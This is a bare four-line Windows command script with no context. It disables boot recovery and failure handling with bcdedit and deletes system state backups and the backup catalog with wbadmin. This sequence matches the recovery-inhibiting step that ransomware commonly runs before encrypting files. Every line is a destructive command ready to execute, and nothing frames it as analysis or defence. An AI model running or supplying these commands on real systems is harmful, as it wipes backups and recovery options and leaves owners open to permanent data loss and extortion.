bcdedit /set bootstatuspolicy ignoreallfailures
bcdedit /set recoveryenabled no
wbadmin delete systemstatebackup
wbadmin delete catalog -quiet
